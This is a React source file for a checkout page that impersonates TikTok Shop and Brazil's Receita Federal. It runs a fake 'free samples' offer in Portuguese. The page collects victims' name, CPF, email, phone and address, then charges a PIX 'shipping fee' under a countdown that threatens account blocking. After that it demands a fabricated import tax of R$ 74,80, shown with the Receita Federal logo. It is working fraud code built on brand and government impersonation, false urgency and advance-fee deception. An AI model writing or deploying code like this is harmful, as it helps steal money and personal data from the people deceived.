import { useState, useEffect, useCallback, useRef } from 'react';
import { useLocation } from 'wouter';
import { Copy, Check, MapPin, AlertTriangle, Clock, X, Loader2 } from 'lucide-react';
import tiktokLogo from '@assets/logo-tiktok-CfBkyC_V_(1)_1771528904425.png';

declare global {
  interface Window {
    fbq?: (...args: any[]) => void;
  }
}

interface PaymentItem {
  id: string;
  name: string;
  brand: string;
  image: string;
  price: number;
}

interface PaymentData {
  transactionId: string;
  qrcode: string;
  amount: number;
  nome: string;
  email: string;
  cpf: string;
  phone: string;
  endereco: string;
  items: PaymentItem[];
  createdAt: number;
}

interface TarifaData {
  transactionId: string;
  qrcode: string;
}

const TIMER_DURATION = 10 * 60 * 1000;
const RECEITA_LOGO = 'https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png';

export default function PaymentPage() {
  const [, setLocation] = useLocation();
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null);
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(TIMER_DURATION);
  const [expired, setExpired] = useState(false);
  const [paid, setPaid] = useState(false);
  const [tarifaModalOpen, setTarifaModalOpen] = useState(false);
  const [tarifaLoading, setTarifaLoading] = useState(false);
  const [tarifaData, setTarifaData] = useState<TarifaData | null>(null);
  const [tarifaCopied, setTarifaCopied] = useState(false);
  const [tarifaPaid, setTarifaPaid] = useState(false);
  const purchaseEventFired = useRef(false);

  useEffect(() => {
    if (paid && !purchaseEventFired.current) {
      purchaseEventFired.current = true;
      if (window.fbq) {
        window.fbq('track', 'Purchase', {
          value: paymentData?.amount || 19.80,
          currency: 'BRL'
        });
      }
    }
  }, [paid, paymentData]);

  useEffect(() => {
    window.scrollTo(0, 0);
    try {
      const saved = localStorage.getItem('tiktok_payment');
      if (saved) {
        const data = JSON.parse(saved) as PaymentData;
        setPaymentData(data);
        const elapsed = Date.now() - data.createdAt;
        const remaining = TIMER_DURATION - elapsed;
        if (remaining <= 0) {
          setExpired(true);
          setTimeLeft(0);
        } else {
          setTimeLeft(remaining);
        }
      }
    } catch {}
  }, []);

  useEffect(() => {
    if (expired || paid || !paymentData) return;
    const interval = setInterval(() => {
      setTimeLeft(prev => {
        const next = prev - 1000;
        if (next <= 0) {
          setExpired(true);
          clearInterval(interval);
          return 0;
        }
        return next;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [expired, paid, paymentData]);

  const checkStatus = useCallback(async () => {
    if (!paymentData || paid || expired) return;
    try {
      const res = await fetch(`/api/pix/status/${paymentData.transactionId}`);
      const data = await res.json();
      if (data.status === 'paid' && data.paidAt) {
        setPaid(true);
      }
    } catch {}
  }, [paymentData, paid, expired]);

  useEffect(() => {
    if (!paymentData || paid || expired) return;
    const interval = setInterval(checkStatus, 2000);
    return () => clearInterval(interval);
  }, [paymentData, paid, expired, checkStatus]);

  const openTarifaModal = async () => {
    setTarifaModalOpen(true);
    setTarifaLoading(true);
    setTarifaData(null);
    try {
      const name = paymentData?.nome || '';
      const email = paymentData?.email || '';
      const cpf = paymentData?.cpf || '';
      const phone = paymentData?.phone || '';
      const res = await fetch('/api/pix/create-tarifa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, email, cpf, phone })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);
      setTarifaData({
        transactionId: data.id,
        qrcode: data.pix?.qrcode || ''
      });
    } catch {
      setTarifaData(null);
    } finally {
      setTarifaLoading(false);
    }
  };

  const checkTarifaStatus = useCallback(async () => {
    if (!tarifaData || tarifaPaid) return;
    try {
      const res = await fetch(`/api/pix/status/${tarifaData.transactionId}`);
      const data = await res.json();
      if (data.status === 'paid' && data.paidAt) {
        setTarifaPaid(true);
        setTarifaModalOpen(false);
        localStorage.removeItem('tiktok_payment');
        localStorage.removeItem('tiktok_user');
      }
    } catch {}
  }, [tarifaData, tarifaPaid]);

  useEffect(() => {
    if (!tarifaData || tarifaPaid) return;
    const interval = setInterval(checkTarifaStatus, 5000);
    return () => clearInterval(interval);
  }, [tarifaData, tarifaPaid, checkTarifaStatus]);

  const handleTarifaCopy = async () => {
    if (!tarifaData?.qrcode) return;
    try {
      await navigator.clipboard.writeText(tarifaData.qrcode);
      setTarifaCopied(true);
      setTimeout(() => setTarifaCopied(false), 2000);
    } catch {}
  };

  const handleCopy = async () => {
    if (!paymentData?.qrcode) return;
    try {
      await navigator.clipboard.writeText(paymentData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {}
  };

  const formatTime = (ms: number) => {
    const totalSec = Math.max(0, Math.floor(ms / 1000));
    const min = Math.floor(totalSec / 60);
    const sec = totalSec % 60;
    return `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
  };

  if (!paymentData) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center px-6">
          <p className="text-sm text-gray-500 mb-4">Nenhum pagamento encontrado.</p>
          <button
            onClick={() => setLocation('/')}
            className="bg-[#FF2A52] text-white font-semibold text-sm px-8 py-3"
            style={{ borderRadius: '6px' }}
            data-testid="button-back-home"
          >
            Voltar para a Loja
          </button>
        </div>
      </div>
    );
  }

  if (paid && tarifaPaid) {
    return (
      <div className="min-h-screen bg-white flex flex-col max-w-[430px] mx-auto">
        <header className="sticky top-0 z-50 bg-black py-3 flex items-center justify-center">
          <img src={tiktokLogo} alt="TikTok Shop" className="h-5" />
        </header>
        <div className="flex-1 flex flex-col items-center justify-center px-6 text-center">
          <div className="w-16 h-16 rounded-full bg-[#25F4EE] flex items-center justify-center mb-4">
            <Check className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-xl font-bold text-black mb-2">Pedido Concluído!</h1>
          <p className="text-sm text-gray-500 mb-6 leading-relaxed">
            Todos os pagamentos foram confirmados. Suas amostras grátis serão enviadas em até 24 horas para o endereço cadastrado.
          </p>
          <button
            onClick={() => setLocation('/')}
            className="bg-[#FF2A52] text-white font-semibold text-sm px-8 py-3"
            style={{ borderRadius: '6px' }}
            data-testid="button-back-home-paid"
          >
            Voltar para a Loja
          </button>
        </div>
      </div>
    );
  }

  if (paid && !tarifaPaid) {
    return (
      <div className="min-h-screen bg-white flex flex-col max-w-[430px] mx-auto">
        <header className="sticky top-0 z-50 bg-black py-3 flex items-center justify-center">
          <img src={tiktokLogo} alt="TikTok Shop" className="h-5" />
        </header>
        <div className="flex-1 flex flex-col items-center px-6 pt-10 text-center">
          <AlertTriangle className="w-20 h-20 text-[#F9A825] mb-5" data-testid="icon-alert-tarifa" />
          <h1 className="text-xl font-bold text-black mb-3">Pedido Não Concluído</h1>
          <p className="text-[15px] text-gray-600 leading-relaxed mb-4">
            Um dos produtos escolhidos é de <span className="font-bold">origem importada</span> e a <span className="font-bold">Receita Federal</span> obriga o pagamento de uma tarifa de <span className="font-bold text-black">R$ 74,80</span> para produtos importados.
          </p>
          <p className="text-[15px] text-gray-600 leading-relaxed mb-4">
            Como o produto é gratuito, apenas o valor dessa tarifa é repassado aos clientes.
          </p>
          <div className="bg-[#F5F5F5] px-4 py-3 w-full mb-4" style={{ borderRadius: '6px' }}>
            <p className="text-[15px] text-gray-600 leading-relaxed">
              Após o pagamento da tarifa de importação, os produtos serão enviados ao endereço de entrega <span className="font-bold text-black">{paymentData?.endereco}</span> em até <span className="font-bold text-black">24 horas</span>.
            </p>
          </div>
          <button
            onClick={openTarifaModal}
            className="w-full bg-[#FF2A52] text-white font-semibold text-[16px] py-3.5 flex items-center justify-center gap-2"
            style={{ borderRadius: '6px' }}
            data-testid="button-regularizar"
          >
            Regularizar Produtos
          </button>
        </div>

        {tarifaModalOpen && (
          <div className="fixed inset-0 z-[100] flex items-end justify-center" data-testid="modal-tarifa">
            <div className="absolute inset-0 bg-black/60" onClick={() => !tarifaLoading && setTarifaModalOpen(false)} />
            <div className="relative bg-white w-full max-w-[430px] rounded-t-2xl px-5 pt-5 pb-8 animate-in slide-in-from-bottom duration-300">
              <button
                onClick={() => !tarifaLoading && setTarifaModalOpen(false)}
                className="absolute top-4 right-4 text-gray-400"
                data-testid="button-close-tarifa"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex justify-center mb-5">
                <img
                  src={RECEITA_LOGO}
                  alt="Receita Federal"
                  className="h-16 object-contain"
                  data-testid="img-receita-logo"
                />
              </div>

              {tarifaLoading && (
                <div className="flex flex-col items-center py-8">
                  <Loader2 className="w-10 h-10 text-[#FF2A52] animate-spin mb-4" />
                  <p className="text-[15px] text-gray-500">Gerando cobrança da tarifa de importação...</p>
                </div>
              )}

              {!tarifaLoading && tarifaData && (
                <div className="text-center">
                  <h3 className="text-[16px] font-bold text-black mb-1">Tarifa de Importação</h3>
                  <p className="text-[24px] font-bold text-[#FF2A52] mb-4" style={{ fontFamily: 'TikTokFont, sans-serif' }}>R$ 74,80</p>
                  <p className="text-[15px] text-gray-500 mb-4">Copie o código abaixo e cole no app do seu banco</p>

                  {tarifaData.qrcode && (
                    <div
                      className="w-full bg-[#F5F5F5] px-3 py-2 mb-3 text-[13px] text-gray-500 overflow-hidden whitespace-nowrap text-ellipsis cursor-pointer"
                      style={{ borderRadius: '6px', height: '36px', lineHeight: '20px' }}
                      onClick={handleTarifaCopy}
                      data-testid="tarifa-pix-code"
                    >
                      {tarifaData.qrcode}
                    </div>
                  )}

                  <button
                    onClick={handleTarifaCopy}
                    className="w-full py-3 font-semibold text-[15px] text-white flex items-center justify-center gap-2 transition-colors"
                    style={{ borderRadius: '6px', background: tarifaCopied ? '#25F4EE' : '#FF2A52' }}
                    data-testid="button-copy-tarifa"
                  >
                    {tarifaCopied ? (
                      <>
                        <Check className="w-5 h-5" />
                        Código Copiado!
                      </>
                    ) : (
                      <>
                        <Copy className="w-5 h-5" />
                        Copiar Código PIX
                      </>
                    )}
                  </button>
                  <p className="text-[13px] text-gray-400 mt-3">O pagamento é processado instantaneamente</p>
                </div>
              )}

              {!tarifaLoading && !tarifaData && (
                <div className="text-center py-6">
                  <p className="text-[15px] text-red-500 mb-3">Erro ao gerar cobrança. Tente novamente.</p>
                  <button
                    onClick={openTarifaModal}
                    className="bg-[#FF2A52] text-white font-semibold text-sm px-6 py-2.5"
                    style={{ borderRadius: '6px' }}
                  >
                    Tentar Novamente
                  </button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    );
  }

  const qrcodeImageUrl = paymentData.qrcode
    ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(paymentData.qrcode)}`
    : '';

  return (
    <div className="min-h-screen bg-white flex flex-col max-w-[430px] mx-auto">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-black py-3 flex items-center justify-center" data-testid="header-payment">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-5" />
      </header>

      {/* Products Summary */}
      <div className="px-4 py-4 border-b-[8px] border-[#EBEBEB]">
        <h2 className="text-[15px] font-semibold text-black mb-3">Seus Produtos</h2>
        <div className="space-y-2">
          {paymentData.items.map((item) => (
            <div key={item.id} className="flex gap-3 items-center" data-testid={`payment-item-${item.id}`}>
              <img src={item.image} alt={item.name} className="w-12 h-12 object-contain rounded bg-[#F6F6F6] p-1" />
              <div className="flex-1 min-w-0">
                <p className="text-[11px] text-gray-500 uppercase">{item.brand}</p>
                <p className="text-[12px] text-black font-medium truncate">{item.name}</p>
              </div>
              <div className="text-right">
                <span className="text-[12px] font-bold text-[#FF2A52]">R$ 0,00</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Delivery Address */}
      <div className="px-4 py-4 border-b-[8px] border-[#EBEBEB]">
        <div className="flex items-start gap-2">
          <MapPin className="w-5 h-5 text-[#FF2A52] mt-0.5 shrink-0" />
          <div>
            <p className="text-[15px] font-semibold text-black">{paymentData.nome}</p>
            <p className="text-[15px] text-gray-500 leading-relaxed mt-0.5">{paymentData.endereco}</p>
          </div>
        </div>
      </div>

      {/* Freight Payment Info */}
      <div className="bg-[#FFF8E1] mx-4 mb-2 mt-2 px-4 py-3" style={{ borderRadius: '6px' }}>
        <div className="flex items-start gap-2">
          <AlertTriangle className="w-5 h-5 text-[#F9A825] mt-0.5 shrink-0" />
          <div>
            <p className="text-[15px] font-semibold text-black">Pagamento do Frete</p>
            <p className="text-[15px] text-gray-600 leading-relaxed mt-1">
              As amostras são <span className="font-bold">100% grátis</span>. É necessário apenas o pagamento do frete de envio dos produtos no valor de <span className="font-bold text-black">R$ 19,80</span>.
            </p>
          </div>
        </div>
      </div>

      {/* Timer Warning */}
      <div className="mx-4 mb-2 px-4 py-3" style={{ borderRadius: '6px', backgroundColor: 'rgba(255, 42, 82, 0.08)' }}>
        <div className="flex items-center justify-center gap-2 mb-2">
          <Clock className="w-5 h-5 text-[#FF2A52]" />
          <span className="text-[24px] font-bold text-[#FF2A52]" style={{ fontFamily: 'TikTokFont, sans-serif' }} data-testid="text-timer">
            {formatTime(timeLeft)}
          </span>
        </div>
        {expired ? (
          <p className="text-[15px] text-[#FF2A52] font-semibold leading-relaxed text-center">
            O tempo expirou. Sua conta poderá ser bloqueada no programa de amostras grátis do TikTok Shop por não realizar o pagamento do frete.
          </p>
        ) : (
          <p className="text-[15px] text-[#FF2A52] leading-relaxed text-center">
            Realize o pagamento do frete dentro do prazo. Caso o pagamento não seja efetuado, sua conta será <span className="font-bold">bloqueada</span> no programa de amostras grátis do TikTok Shop.
          </p>
        )}
      </div>

      {/* PIX Copy and Paste */}
      <div className="mx-4 px-4 py-4 border-t-[8px] border-[#EBEBEB] mt-2">
        <h3 className="text-[16px] font-semibold text-black text-center mb-3">Pague via PIX</h3>
        <p className="text-[15px] text-gray-500 text-center mb-4">
          Copie o código abaixo e cole no app do seu banco
        </p>

        {/* PIX Code Display */}
        {paymentData.qrcode && (
          <div
            className="w-full bg-[#F5F5F5] px-3 py-2 mb-3 text-[13px] text-gray-500 overflow-hidden whitespace-nowrap text-ellipsis cursor-pointer"
            style={{ borderRadius: '6px', height: '36px', lineHeight: '20px' }}
            onClick={handleCopy}
            data-testid="pix-code-display"
          >
            {paymentData.qrcode}
          </div>
        )}

        {/* Copy Button */}
        <button
          onClick={handleCopy}
          className="w-full py-3 font-semibold text-[15px] text-white flex items-center justify-center gap-2 transition-colors"
          style={{ borderRadius: '6px', background: copied ? '#25F4EE' : '#FF2A52' }}
          data-testid="button-copy-pix"
        >
          {copied ? (
            <>
              <Check className="w-5 h-5" />
              Código Copiado!
            </>
          ) : (
            <>
              <Copy className="w-5 h-5" />
              Copiar Código PIX
            </>
          )}
        </button>

        {/* QR Code */}
        {qrcodeImageUrl && (
          <div className="flex justify-center mt-4" data-testid="qrcode-container">
            <img
              src={qrcodeImageUrl}
              alt="QR Code PIX"
              className="w-48 h-48"
              data-testid="img-qrcode"
            />
          </div>
        )}

        <p className="text-[15px] text-gray-400 text-center mt-3">
          O pagamento é processado instantaneamente
        </p>
      </div>

      {/* Footer */}
      <footer className="bg-black text-white py-8 px-4 mt-auto">
        <div className="text-center">
          <img src={tiktokLogo} alt="TikTok Shop" className="h-6 mx-auto mb-4" />
          <p className="text-[15px] text-gray-400 mb-2">Sua loja favorita no TikTok</p>
          <div className="flex items-center justify-center gap-3 flex-wrap text-[15px] text-gray-500">
            <span>Termos de Uso</span>
            <span>Privacidade</span>
            <span>Sobre Nós</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
